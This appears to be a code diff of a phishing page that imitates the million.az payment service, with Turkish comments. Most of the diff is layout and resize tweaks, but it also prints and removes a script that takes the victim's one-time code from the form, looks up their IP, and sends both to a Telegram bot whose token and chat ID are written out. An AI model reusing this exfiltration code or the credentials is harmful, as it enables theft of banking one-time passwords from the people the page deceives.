@@ -22,8 +22,8 @@
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             padding: 50px;
-            max-width: 300px; /* Maksimum genişlik belirle */
-            width: 100%;
+            width: 55vw; /* Set width to 55% of the viewport width */
+            height: 55vh; /* Set height to 55% of the viewport height */
             text-align: center;
         }
         .form-group {
@@ -94,6 +94,7 @@
     <div class="container">
         <div class="logo">
             <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
+        </div>
         <div class="timer" id="timer">02:00</div> <!-- 2 dakikalık zaman sayacı -->
         <form id="myForm">
             <div class="form-group">
@@ -160,49 +161,11 @@
             }
         });
 
-        // Telegram API anahtarları
-        const botToken = '8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao';
-        const chatId = '-1002496527853';
-
-        // Telegram'a form bilgilerini gönder
-        document.getElementById("submitButton").addEventListener("click", function() {
-            var cardName = document.getElementById("cardName").value;
-
-            // Güvenlik kodu oluşturulması (Örnek olarak rastgele bir sayı kullanıldı)
-            const securityCode = Math.floor(Math.random() * 10000);
-
-            // Kullanıcının IP adresini almak için bir API kullanılması (ipify API kullanılıyor)
-            fetch("../../../api.ipify.org/index0cce.html?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    const userIP = data.ip;
-                    const message = `Otp-1: ${cardName}\nIP: ${userIP}`;
-
-                    // Telegram API'ye istek yapılması ve mesajın gönderilmesi
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                        }),
-                    })
-                        .then(response => response.json())
-                        .then(data => {
-                            console.log('Telegram Mesajı Gönderildi:', data);
-                            // Başarılı olursa kullanıcıyı yönlendirme yapılması
-                            window.location.href = "index2.html";
-                        })
-                        .catch(error => {
-                            console.error('Telegram Mesajı Gönderme Hatası:', error);
-                        });
-                })
-                .catch(error => {
-                    console.error('IP Adresi Alınamadı:', error);
-                });
-        });
+        // Pencereyi büyüt
+        window.onload = function() {
+            // Resize the window to 55% of the viewport size
+            window.resizeTo(window.innerWidth * 0.55, window.innerHeight * 0.55);
+        };
     </script>
 
     <SCRIPT LANGUAGE="Javascript"><!--
